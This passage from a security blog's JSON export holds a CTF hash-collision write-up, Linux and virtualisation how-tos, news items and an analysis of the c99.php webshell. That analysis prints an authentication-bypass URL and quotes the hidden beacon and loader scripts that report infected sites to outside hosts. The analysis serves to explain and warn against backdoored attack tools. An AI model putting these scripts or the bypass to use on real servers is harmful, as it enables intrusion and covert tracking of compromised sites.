hexadecimal digits representing 20 bytes. One byte, i.e. two hexadecimal digits are used for each character in the colliding password. Here, how to generate the collision password:12echo -n 'complexPasswordWhichContainsManyCharactersWithRandomSuffixeghjrjg' | sha1sum | xxd -r -pe6~n22k81&lt;[p\"k5hhV6* Note that: -n option of echo do not output the trailing newline else generated password would be wrong. xxd - make a hexdump or do the reverse. -r or -revert: convert hexdump into binary. -p or -ps or -postscript or -plain: output in postscript continuous hexdump style. Also known as plain hexdump style. -r -p: Use the combination -r -p to read plain hexadecimal dumps without line number information and without a particular column layout. That is why complexPasswordWhichContainsManyCharactersWithRandomSuffixeghjrjg and e6~n22k81&lt;[p&quot;k5hhV6* have the same PBKDF2-HMAC-SHA1 hash. There is an infinity of PBKDF2-HMAC-SHA1 collisions. While it’s easy to find a collision for any given string larger than 64 bytes (just run the above Bash command), it gets trickier if you want the colliding password to consist of readable ASCII characters only. SHA1 hashes can contain any hexadecimal digits, and converting such a hash back into a string is likely to result in at least one character outside of the printable ASCII range ([\\x20-\\x7E]). To see how to choose a prefix for the colliding password go to [link][mathiasbynens.be. Flag Since Backdoor is an always-online CTF platform, and not a one time contest, we kindly request you to not publish flags for the challenges in your writeups.Writeups are an excellent way to share knowledge and help others learn. In Backdoor, challenges are shifted from a contest to the Practice section, where people can continue to attempt them after the contest is over. It would be very unfair to participants if the flags for the problems were easily available in writeups online.Hence, we kindly request to not publish flags of the problems that you solve. Here is an example of an excellent writeup which refrains from giving the complete solution.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"crypto","slug":"crypto","permalink":"http://rawsec.ml/tags/crypto/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"How to manually configure Firefox / Waterfox language","slug":"how-to-manually-configure-firefox-waterfox-language","date":"2016-05-20T22:00:00.000Z","updated":"2016-10-12T21:07:54.542Z","comments":true,"path":"en/how-to-manually-configure-firefox-waterfox-language/","link":"","permalink":"http://rawsec.ml/en/how-to-manually-configure-firefox-waterfox-language/","excerpt":"","text":"Go to https://ftp.mozilla.org/pub/firefox/releases/ Choose the Firefox version, ex: 46.0 Choos the architecture, ex: linux-x86_64 Go into the xpi folder Choose a language, ex: fr.xpi Click on the choosen language xpi file and enable the patch Restart Firefox In the URL navigation bar, wirte about:config In the Filter field, write general.useragent.locale Double-click on the key to edit it and eplace the value en-US with fr-FR for example Restart Firefox Firefox / Waterfox is now in the newly configured language.","categories":[{"name":"misc","slug":"misc","permalink":"http://rawsec.ml/categories/misc/"}],"tags":[{"name":"firefox","slug":"firefox","permalink":"http://rawsec.ml/tags/firefox/"}],"keywords":[{"name":"misc","slug":"misc","permalink":"http://rawsec.ml/categories/misc/"}]},{"title":"Virtualbox : shared folder with guest","slug":"virtualbox-shared-folder-with-guest","date":"2016-05-20T22:00:00.000Z","updated":"2016-11-03T17:31:22.382Z","comments":true,"path":"en/virtualbox-shared-folder-with-guest/","link":"","permalink":"http://rawsec.ml/en/virtualbox-shared-folder-with-guest/","excerpt":"","text":"This how-to works independently of the host platform. On virtualbox : Open the Configuration window of the VM (guest) Select Shared folder on the left menu Click on the icon corresponding to Add a shared folder Complete Folder path and Folder name fields, ex: /folder/to/share and folder-shared On the guest VM: Create a folder (an existant one can be used), ex: 1$ mkdir /home/user/vbox-shared Mount the shared folder and is file system as root, ex: 1# mount -t vboxsf [FOLDER_NAME] [GUEST_PATH] with [FOLDER_NAME] the name of the shared folder created on virtualbox and [GUEST_PATH] the folder path where the share file system have to be mounted. So here that will give: 1# mount -t vboxsf folder-shared /home/user/vbox-shared Note : Even if a permanent shared folder was created, the mount command will have to be runned each time the guest restart. Mounting a file system requires root privileges, but instead of mounting the file system as roor like previously, it’s preferable to mount it as a user: 1$ mount -t vboxsf -o umask=0022,gid=1000,uid=1000 folder-shared /home/user/vbox-shared Where the gid and uid value math with the ones of the user (it can be check with the id command).","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}],"tags":[{"name":"virtualization","slug":"virtualization","permalink":"http://rawsec.ml/tags/virtualization/"},{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"http://rawsec.ml/tags/system/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}]},{"title":"How to find out the Linux distribution name and version","slug":"find-out-linux-distribution-name-and-version","date":"2016-05-04T22:00:00.000Z","updated":"2016-10-12T21:07:54.482Z","comments":true,"path":"en/find-out-linux-distribution-name-and-version/","link":"","permalink":"http://rawsec.ml/en/find-out-linux-distribution-name-and-version/","excerpt":"","text":"There is the old method cat /etc/*-release to match distribution release file. For example on openSUSE this will match with /etc/SuSE-release. This method is deprecated and will be removed in the future. 123456789101112131415cat /etc/*-releaseNAME=\"openSUSE Leap\"VERSION=\"42.1\"VERSION_ID=\"42.1\"PRETTY_NAME=\"openSUSE Leap 42.1 (x86_64)\"ID=opensuseANSI_COLOR=\"0;32\"CPE_NAME=\"cpe:/o:opensuse:opensuse:42.1\"BUG_REPORT_URL=\"https://bugs.opensuse.org\"HOME_URL=\"https://opensuse.org/\"ID_LIKE=\"suse\"openSUSE 42.1 (x86_64)VERSION = 42.1CODENAME = Malachite# /etc/SuSE-release is deprecated and will be removed in the future, use /etc/os-release instead There is a more modern and more universal method cat /etc/os-release. 1234567891011cat /etc/os-releaseNAME=\"openSUSE Leap\"VERSION=\"42.1\"VERSION_ID=\"42.1\"PRETTY_NAME=\"openSUSE Leap 42.1 (x86_64)\"ID=opensuseANSI_COLOR=\"0;32\"CPE_NAME=\"cpe:/o:opensuse:opensuse:42.1\"BUG_REPORT_URL=\"https://bugs.opensuse.org\"HOME_URL=\"https://opensuse.org/\"ID_LIKE=\"suse\" There is also a command with a more concise output lsb_release -a. 123456lsb_release -aLSB Version: core-5.0-amd64:core-5.0-noarchDistributor ID: SUSE LINUXDescription: openSUSE Leap 42.1 (x86_64)Release: 42.1Codename: n/a To know the kernel version there is the uname command: uname -a to have all informations uname -rs to have kernel name and version only uname -m to have architecture type 12uname -aLinux linux-7o7a.site 4.1.20-11-default #1 SMP PREEMPT Fri Mar 18 14:42:07 UTC 2016 (0a392b2) x86_64 x86_64 x86_64 GNU/Linux 12uname -rsLinux 4.1.20-11-default 12uname -mx86_64 An alternative method is to see the /proc/version file that is showing kernel version and gcc version used to build it. 12cat /proc/versionLinux version 4.1.20-11-default (geeko@buildhost) (gcc version 4.8.5 (SUSE Linux) ) #1 SMP PREEMPT Fri Mar 18 14:42:07 UTC 2016 (0a392b2)","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"http://rawsec.ml/tags/system/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}]},{"title":"c99.php : A backdoor backdoored","slug":"c99-php-backdoor-backdoored","date":"2016-04-18T22:00:00.000Z","updated":"2016-10-12T21:07:54.518Z","comments":true,"path":"en/c99-php-backdoor-backdoored/","link":"","permalink":"http://rawsec.ml/en/c99-php-backdoor-backdoored/","excerpt":"","text":"C99 is a PHP webshell. Attackers uploads it on web server in order to get informations and above all execute commands with web user privileges (ex: www-data). This webshell is protected by a customizable password, so interface access is limited to people who know the password. But the password verification mechanism is vulnerable … in fact the flaw was deliberately inserted into the code to permit the webshell author to bypass it. Code1234567891011121314151617181920212223242526272829303132333435[...]//Authentication$login = \"\"; //login//DON'T FORGOT ABOUT PASSWORD!!!$pass = \"\"; //password$md5_pass = \"\"; //md5-cryped pass. if null, md5($pass)[...]@$f = $_REQUEST[\"f\"];@extract($_REQUEST[\"c999shcook\"]);//END CONFIGURATION// \\/Next code isn't for editing\\/@set_time_limit(0);$tmp = array();foreach($host_allow as $k=&gt;$v) &#123;$tmp[] = str_replace(\"\\\\*\",\".*\",preg_quote($v));&#125;$s = \"!^(\".implode(\"|\",$tmp).\")$!i\";if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) &#123;exit(\"&lt;a href=\\\"http://ccteam.ru/releases/cc999shell\\\"&gt;c999shell&lt;/a&gt;: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");&#125;if (!empty($login))&#123; if (empty($md5_pass)) &#123;$md5_pass = md5($pass);&#125; if (($_SERVER[\"PHP_AUTH_USER\"] != $login) or (md5($_SERVER[\"PHP_AUTH_PW\"]) != $md5_pass)) &#123; if (empty($login_txt)) &#123;$login_txt = strip_tags(ereg_replace(\"&amp;nbsp;|&lt;br&gt;\",\" \",$donated_html));&#125; header(\"WWW-Authenticate: Basic realm=\\\"c999shell \".$shver.\": \".$login_txt.\"\\\"\"); header(\"HTTP/1.0 401 Unauthorized\"); exit($accessdeniedmess); &#125;&#125;[...] VulnerabilityUsername and password are hardcoded to be easily editable.12345//Authentication$login = \"\"; //login//DON'T FORGOT ABOUT PASSWORD!!!$pass = \"\"; //password$md5_pass = \"\"; //md5-cryped pass. if null, md5($pass) Next, login and password are checked by the following code:1if (($_SERVER[\"PHP_AUTH_USER\"] != $login) or (md5($_SERVER[\"PHP_AUTH_PW\"]) != $md5_pass)) If login and password are not correct, an error page indicate that access is forbidden. But checking is processed only if login is not empty: if (!empty($login)). $login is normally initialized staticly at the begining but after that the variable can be modified by extract() function :1@extract($_REQUEST[\"c999shcook\"]); extract() functionPHP documentation say : extract (PHP 4, PHP 5, PHP 7) extract — Import variables into the current symbol table from an arrayDescriptionImport variables from an array into the current symbol table. Checks each key to see whether it has a valid variable name. It also checks for collisions with existing variables in the symbol table. 1int extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] ) extract() is mostly used to initialize variables from an array. For example:1234567891011&lt;?php$var_array = array(\"color\" =&gt; \"blue\", \"size\" =&gt; \"medium\", \"shape\" =&gt; \"sphere\");extract($var_array);echo \"$color, $size, $shape\\n\";?&gt; will output:1blue, medium, sphere So for each line of the array, the key becomes the variable name and the value is given to the variable. This function is dangerous because of it default behaviour : if a key of the extracted array match with an existant variable, the variable value will be replaced by the value of the array given in paramteter to extract(). To develop a secure software, never use extract() with unknown data or user's data (ex: prompt). There are flags (ex: EXTR_SKIP) to protect already existing variable. ExploitBypass authentification is very simple : overwrite $login variable.1http://url.com/c99.php?c999shcook[login]=0 It’s possible because of:1@extract($_REQUEST[\"c999shcook\"]); Why a backdoor?Pirates infect websites with webshells, but because this webshell is backdoored other pirates (authors of the webshell) will be able to control the server too. extract() function and c999shcook array are useless for the webshell but allow to overwrite any variables in the PHP script. There is another flaw There is a lot of c99.php variant: c99, c999, c99shell, c99unlimited, ... so some differences may occure. There is multiple version of each variant and each variant can be declined in multiple forms: php, txt, jpg, ... The simplest versions of c99 include a clear script:1&lt;script src=http://www.r57.gen.tr/yazciz/ciz.js&gt;&lt;/script&gt; Others like c99-bd try to poorly obfuscate it:1&lt;SCRIPT SRC=&amp;#x68&amp;#fthfthfjgyk&amp;#x2f&amp;#x2f&amp;#x77&amp;#x77&amp;#x77&amp;#x2e&amp;#x70&amp;#x72&amp;#x69&amp;#x76&amp;#x63&amp;#x30&amp;#x64&amp;#x65&amp;#x2e&amp;#x63&amp;#x6f&amp;#x6d&amp;#x2f&amp;#x69&amp;#x6d&amp;#x61&amp;#x67&amp;#x65&amp;#x73&amp;#x2f&amp;#x79&amp;#x61&amp;#x7a&amp;#x2e&amp;#x6a&amp;#x73&gt;&lt;/SCRIPT&gt; But a simple HTML decoder will decode http://www.privc0de.com/images/yaz.js. Others like c100, r57, c999 or updated c99 version have more sophisticated method like packing the script:1234&lt;script type=\"text/javascript\"&gt;if(typeof btoa==\"undefined\")btoa=function(a,b)&#123;b=(typeof b=='undefined')?false:b;var d,o2,o3,bits,h1,h2,h3,h4,e=[],pad='',c,plain,coded;var f=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";plain=b?Utf8.encode(a):a;c=plain.length%3;if(c&gt;0)&#123;while(c++&lt;3)&#123;pad+='=';plain+='\\0'&#125;&#125;for(c=0;c&lt;plain.length;c+=3)&#123;d=plain.charCodeAt(c);o2=plain.charCodeAt(c+1);o3=plain.charCodeAt(c+2);bits=d&lt;&lt;16|o2&lt;&lt;8|o3;h1=bits&gt;&gt;18&amp;0x3f;h2=bits&gt;&gt;12&amp;0x3f;h3=bits&gt;&gt;6&amp;0x3f;h4=bits&amp;0x3f;e[c/3]=f.charAt(h1)+f.charAt(h2)+f.charAt(h3)+f.charAt(h4)&#125;coded=e.join('');coded=coded.slice(0,coded.length-pad.length)+pad;return coded&#125;;if(typeof atob==\"undefined\")atob=function(a,b)&#123;b=(typeof b=='undefined')?false:b;var e,o2,o3,h1,h2,h3,h4,bits,d=[],plain,coded;var f=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";coded=b?Utf8.decode(a):a;for(var c=0;c&lt;coded.length;c+=4)&#123;h1=f.indexOf(coded.charAt(c));h2=f.indexOf(coded.charAt(c+1));h3=f.indexOf(coded.charAt(c+2));h4=f.indexOf(coded.charAt(c+3));bits=h1&lt;&lt;18|h2&lt;&lt;12|h3&lt;&lt;6|h4;e=bits&gt;&gt;&gt;16&amp;0xff;o2=bits&gt;&gt;&gt;8&amp;0xff;o3=bits&amp;0xff;d[c/4]=String.fromCharCode(e,o2,o3);if(h4==0x40)d[c/4]=String.fromCharCode(e,o2);if(h3==0x40)d[c/4]=String.fromCharCode(e)&#125;plain=d.join('');return b?Utf8.decode(plain):plain&#125;;setTimeout(function()&#123;new Function(atob(atob(document.getElementById('ghdescon').src.substr(22)).match(/ghdescon(.*?)ghdescon/)[1])).apply(this);kk(1);&#125;, 500);&lt;/script&gt; and unpack code can be a lot more complex than only base64_decode it or hex_to_ascii it. The goal is always the same : each time the page is displayed, the website hosting the webshell will do a request to the malicious address and send the URL where it comes from, permiting to the malicious author to know all the website hosting the backdoored webshell. The malicious script from http://www.r57.gen.tr/yazciz/ciz.js looks like this:1a=new/**/Image();a.src='http://www.r57.gen.tr/r00t/yaz.php?a='+escape(location.href); Script kiddies, lamers, and inattentive pirates will use webshells without looking carefully at the code.The combo flaw + inventory of infected website is an easy way, for webshells’ authors, to control a network of server (ex: creating a botnet) by letting to others the system corruption task. More sophisticated piracy tools have some vulnerabilities too. Malwares like Smoke Loader (SQL injection), CrimePack (SQL injection) or Zeus (remote access via upload) have been corrupted. WarningWhen using tools, be carefull, backdoors may be hidden. Pay attention to images, scripts, css, external request, mail functions, encoded code, … Source: C99.php : Quand même les backdoors sont backdoorées by Hugo Ballesteros","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"backdoor","slug":"backdoor","permalink":"http://rawsec.ml/tags/backdoor/"},{"name":"webshell","slug":"webshell","permalink":"http://rawsec.ml/tags/webshell/"},{"name":"php","slug":"php","permalink":"http://rawsec.ml/tags/php/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"}]},{"title":"Tracking down Tor users with mouse movements","slug":"tracking-down-tor-users-with-mouse-movements","date":"2016-04-17T22:00:00.000Z","updated":"2016-10-12T21:07:54.492Z","comments":true,"path":"en/tracking-down-tor-users-with-mouse-movements/","link":"","permalink":"http://rawsec.ml/en/tracking-down-tor-users-with-mouse-movements/","excerpt":"","text":"Jose Carlos Norte, security researcher, wrote a post detailing how Tor Browser users can be uniquely fingerprinted using the mouse wheel, mouse speed, a CPU benchmark, and “getClientRects”. POCs (proof-of-concept) can be tested here and here.Fingerprinting method rely on javascript. Each method alone is not very accurate but crossing data from mouse wheel speed, mouse cursor speed (effectively enhanced by personal OS mouse sensitivity preferences and preferred set of gestures), trackpad movements, Javascript CPU informations, and getClientRects() function makes the fingerprint very unique. Here an example of datas that can be collected with JavaScript:123456789101112131415Client rects:&#123;&quot;x&quot;:131.5,&quot;y&quot;:462,&quot;width&quot;:724,&quot;height&quot;:19,&quot;top&quot;:462,&quot;right&quot;:855.5,&quot;bottom&quot;:481,&quot;left&quot;:131.5&#125;scrolling milis:[2,2,0,3,0,1,0,2,3,0,0,3,1,2,2,1,2,1,4,4,35,2,1,3,0,1,0,3,0,1,0,3,0,1,0,3,1,0,3,1,3,0,1,3,2,4,4,8,44,4,1,4,4,405,2,3,2,1,3,1,3,57,2,0,2,2,0,2,2,4,60,2,0,2,2,0,2,2,6,54,2,2,2,0,2,1,4,8]scrolling deltas:[3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]Biggest mouse step: 65In a few seconds, the result of the CPU benchmark will appear, pleasewait...CPU Mean: 3245 The effectiveness of these methods is dependent upon the ability of the attackers to measure time accurately on Tor at the 1-millisecond level which is pretty difficult on Tor. We already known that JavaScript was dangerous for security and anonimity and that tools like NoScript exist to avoid those problems.","categories":[{"name":"news","slug":"news","permalink":"http://rawsec.ml/categories/news/"},{"name":"security","slug":"news/security","permalink":"http://rawsec.ml/categories/news/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"news","slug":"news","permalink":"http://rawsec.ml/tags/news/"},{"name":"tor","slug":"tor","permalink":"http://rawsec.ml/tags/tor/"}],"keywords":[{"name":"news","slug":"news","permalink":"http://rawsec.ml/categories/news/"},{"name":"security","slug":"news/security","permalink":"http://rawsec.ml/categories/news/security/"}]},{"title":"How to convert VirtualBox vdi to KVM qcow2","slug":"convert-virtualbox-vdi-to-kvm-qcow2","date":"2016-04-12T22:00:00.000Z","updated":"2016-10-12T21:07:54.542Z","comments":true,"path":"en/convert-virtualbox-vdi-to-kvm-qcow2/","link":"","permalink":"http://rawsec.ml/en/convert-virtualbox-vdi-to-kvm-qcow2/","excerpt":"","text":"VBoxManage can’t directly convert vdi to qcow2, so there is two options : With VBoxManage convert vdi to raw and with qemu-img convert raw to qcow2 With qemu-img convert vdi to qcow2 Notes : vdi are compressed and raw images are not so you will need to leave enough disk space for entire uncompressed disk.qcow2 images are compressed too and automaticaly sized. Method with intermediate Make sure the VirtualBox VM is shutdown Convert the vdi to a raw disk images 1VBoxManage clonehd --format raw vm.vdi vm.raw Convert the raw to qcow2 disk images 1qemu-img convert -f raw vm.raw -O qcow2 vm.qcow2 Direct methodqemu-img support VDI, so it can be convert directly:1qemu-img convert -f vdi vm.vdi -O qcow2 vm.qcow2","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}],"tags":[{"name":"virtualization","slug":"virtualization","permalink":"http://rawsec.ml/tags/virtualization/"},{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"http://rawsec.ml/tags/system/"},{"name":"qemu","slug":"qemu","permalink":"http://rawsec.ml/tags/qemu/"},{"name":"kvm","slug":"kvm","permalink":"http://rawsec.ml/tags/kvm/"},{"name":"virtualbox","slug":"virtualbox","permalink":"http://rawsec.ml/tags/virtualbox/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}]},{"title":"How to configure VM Auto Start in Hyper-V with PowerShell","slug":"vm-automatic-start-hyperv-powershell","date":"2016-04-06T22:00:00.000Z","updated":"2016-10-12T21:07:54.542Z","comments":true,"path":"en/vm-automatic-start-hyperv-powershell/","link":"","permalink":"http://rawsec.ml/en/vm-automatic-start-hyperv-powershell/","excerpt":"","text":"VM automatic action at Hyper-V start up1Set-VM [VM_NAME] -AutomaticStartAction [Option] With : [VM_NAME] : The VM name [Option] : Nothing : When the host is powered on, the VM will do nothing StartIfRunning : The VM will start only if it was running when the host was stopped Start : The VM will start up automatically not matter what state the VM was in previously Change startup delay1Set-VM [VM_NAME] -AutomaticStartDelay [Delay] With : [VM_NAME] : The VM name [Delay] : Delay in second Display VM Start action and delayAll :1Get-VM -VMName * | Select-Object VMName,AutomaticStartAction,AutomaticStartDelay One :1Get-VM -VMName [VM_NAME] | Select-Object VMName,AutomaticStartAction,AutomaticStartDelay With : [VM_NAME] : The VM name","categories":[{"name":"windows","slug":"windows","permalink":"http://rawsec.ml/categories/windows/"}],"tags":[{"name":"virtualization","slug":"virtualization","permalink":"http://rawsec.ml/tags/virtualization/"},{"name":"windows","slug":"windows","permalink":"http://rawsec.ml/tags/windows/"},{"name":"hyper-v","slug":"hyper-v","permalink":"http://rawsec.ml/tags/hyper-v/"}],"keywords":[{"name":"windows","slug":"windows","permalink":"http://rawsec.ml/categories/windows/"}]},{"title":"How to disable SSH login for the root user","slug":"disable-ssh-login-for-root-user","date":"2016-04-06T22:00:00.000Z","updated":"2016-10-12T21:07:54.482Z","comments":true,"path":"en/disable-ssh-login-for-root-user/","link":"","permalink":"http://rawsec.ml/en/disable-ssh-login-for-root-user/","excerpt":"","text":"Create a new user. In the following example, we will name it bob. 123root# adduser bobroot# id bobuid=1000(bob) gid=1000(bob) groupes=1000(bob) Set the password for the new user. 12345root# passwd bobChanging password for user bob.New UNIX password:Retype new UNIX password:passwd: all authentication tokens updated successfully. In order to add sudo permissions for the new user, add bob ALL=(ALL) ALL in /etc/sudoers or add bob in wheel group with usermod -a -G wheel bob. Try to connect SSH with bob user. 1ssh bob@my.ip Verify you can switch user to root with bob. 1234bob$ su -Password:root# whoamiroot Disable root SSH login: 1root# vim /etc/ssh/sshd_config and change #PermitRootLogin yes into PermitRootLogin no. Now, we can restart SSH server.1root# systemctl restart sshd.service","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"operating system","slug":"security/operating-system","permalink":"http://rawsec.ml/categories/security/operating-system/"},{"name":"centos","slug":"security/operating-system/centos","permalink":"http://rawsec.ml/categories/security/operating-system/centos/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"centos","slug":"centos","permalink":"http://rawsec.ml/tags/centos/"},{"name":"ssh","slug":"ssh","permalink":"http://rawsec.ml/tags/ssh/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"operating system","slug":"security/operating-system","permalink":"http://rawsec.ml/categories/security/operating-system/"},{"name":"centos","slug":"security/operating-system/centos","permalink":"http://rawsec.ml/categories/security/operating-system/centos/"}]},{"title":"FreeBSD 10.3 is here","slug":"update-freebsd-103","date":"2016-04-05T22:00:00.000Z","updated":"2016-10-12T21:07:54.508Z","comments":true,"path":"en/update-freebsd-103/","link":"","permalink":"http://rawsec.ml/en/update-freebsd-103/","excerpt":"","text":"FreeBSD update to version 10.3. Main improvments: 15 security flaws patched UEFI support Gnome 3.16.2 Full Release Notes on official FreeBSD website.","categories":[{"name":"news","slug":"news","permalink":"http://rawsec.ml/categories/news/"},{"name":"security","slug":"news/security","permalink":"http://rawsec.ml/categories/news/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"system","slug":"system","permalink":"http://rawsec.ml/tags/system/"},{"name":"news","slug":"news","permalink":"http://rawsec.ml/tags/news/"},{"name":"bsd","slug":"bsd","permalink":"http://rawsec.ml/tags/bsd/"},{"name":"update","slug":"update","permalink":"http://rawsec.ml/tags/update/"}],"keywords":[{"name":"news","slug":"news","permalink":"http://rawsec.ml/categories/news/"},{"name":"security","slug":"news/security","permalink":"http://rawsec.ml/categories/news/security/"}]},{"title":"OpenBSD 5.9 is here","slug":"update-openbsd-59","date":"2016-04-05T22:00:00.000Z","updated":"2016-10-12T21:07:54.528Z","comments":true,"path":"en/update-openbsd-59/","link":"","permalink":"http://rawsec.ml/en/update-openbsd-59/","excerpt":"","text":"OpenBSD update to version 5.9. Main improvments: Pledge - a new mitigation mechanism process in restricted mode security improved 70% of user components converted WiFi 802.11n multithread network pile Xen support improved (better performance when OpenBSD is virtualized) UEFI support GUID (GPT) partition table support","categories":[{"name":"news","slug":"news","permalink":"http://rawsec.ml/categories/news/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"system","slug":"system","permalink":"http://rawsec.ml/tags/system/"},{"name":"news","slug":"news","permalink":"http://rawsec.ml/tags/news/"},{"name":"bsd","slug":"bsd","permalink":"http://rawsec.ml/tags/bsd/"},{"name":"update","slug":"update","permalink":"http://rawsec.ml/tags/update/"}],"keywords":[{"name":"news","slug":"news","permalink":"http://rawsec.ml/categories/news/"}]},{"title":"Examine the codes sent by the keyboard","slug":"showkey-ascii","date":"2016-04-01T22:00:00.000Z","updated":"2016-10-12T21:07:54.482Z","comments":true,"path":"en/showkey-ascii/","link":"","permalink":"http://rawsec.ml/en/showkey-ascii/","excerpt":"","text":"A usefull command if are want to read keyboard input : showkey. Very useful to know keycodes when programming. What is showkey ?showkey - examine the codes sent by the keyboard How does it work ?showkey have only 3 options (4 with help) : -s --scancodes : Starts showkey in scan code dump mode. -k --keycodes : Starts showkey in keycode dump mode. This is the default, when no command line options are present. -a --ascii : Starts showkey in `ascii’ dump mode. Note : Only -a will fully works on X mode (with a graphical terminal), -s and -k mode may work on X mode if you have root permissions else use a text console (TTY 1 to 6). Example12345678910111213141516showkey -aPress any keys - Ctrl-D will terminate this programa 97 0141 0x61z 122 0172 0x7ae 101 0145 0x65r 114 0162 0x72t 116 0164 0x74y 121 0171 0x79_ 95 0137 0x5f? 63 0077 0x3f^? 127 0177 0x7f^M 13 0015 0x0d^C 3 0003 0x03^D 4 0004 0x04","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"http://rawsec.ml/tags/system/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}]},{"title":"Newsoo: a French Usenet access provider has been closed","slug":"newsoo-usenet-closed","date":"2016-03-26T23:00:00.000Z","updated":"2016-10-12T21:07:54.505Z","comments":true,"path":"en/newsoo-usenet-closed/","link":"","permalink":"http://rawsec.ml/en/newsoo-usenet-closed/","excerpt":"","text":"The man known as Optix, the owner of Newsoo, was taken into custody by the DIPJ the 2016/03/22. Newsoo was a French Usenet provider, the service was delivering 2 GB of pirated data per second. Sacem press charges against Newsoo.fr website on october 2014. Newsoo was an independant Usenet network, it was a French Autonomous system (AS203679). Optix, owner and administrator of Newsoo, is 26 years old and was offering access to pirated content Newsgroup for a price from 8€ to 20€. The website is now closed. Newsoo had 5000 customers and the man was managing the Usenet network as a legal business. During the arrest, 650 TB of data was blocked and 130 hard disk drivers was seized.","categories":[{"name":"news","slug":"news","permalink":"http://rawsec.ml/categories/news/"},{"name":"warez","slug":"news/warez","permalink":"http://rawsec.ml/categories/news/warez/"}],"tags":[{"name":"news","slug":"news","permalink":"http://rawsec.ml/tags/news/"},{"name":"warez","slug":"warez","permalink":"http://rawsec.ml/tags/warez/"},{"name":"piracy","slug":"piracy","permalink":"http://rawsec.ml/tags/piracy/"},{"name":"usenet","slug":"usenet","permalink":"http://rawsec.ml/tags/usenet/"}],"keywords":[{"name":"news","slug":"news","permalink":"http://rawsec.ml/categories/news/"},{"name":"warez","slug":"news/warez","permalink":"http://rawsec.ml/categories/news/warez/"}]},{"title":"How to change OpenSSH port on CentOS 7","slug":"change-openssh-port-centos-7","date":"2016-03-02T23:00:00.000Z","updated":"2016-10-12T21:07:54.492Z","comments":true,"path":"en/change-openssh-port-centos-7/","link":"","permalink":"http://rawsec.ml/en/change-openssh-port-centos-7/","excerpt":"","text":"Before beginningThese are the steps to do on the SSH server. Be sure to do all the steps before exiting SSH connection if you are connected via SSH. This config was tested for default CentOS 7 iso. Change the SSH portYou can start by backup your current SSH configuration : 1sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bck You can now open the default SSH configuration file : 1sudo vi /etc/ssh/sshd_config Un-comment the Port line and change the value. 1Port 44223 Save the file. By default, SELinux only allow port 22 for SSH. So you need to enable the new port through SELinux : 1sudo semanage port -a -t ssh_port_t -p tcp 44223 You can now restart the SSH server : 1sudo systemctl restart sshd.service Verify that SSH is now running on the new port : 1ss -tnlp | grep ssh You may want to try the SSH connexion with another user before exiting your current SSH session. You can now use the new port number : 1ssh user@example.com -p 44223 That’s it !","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"operating 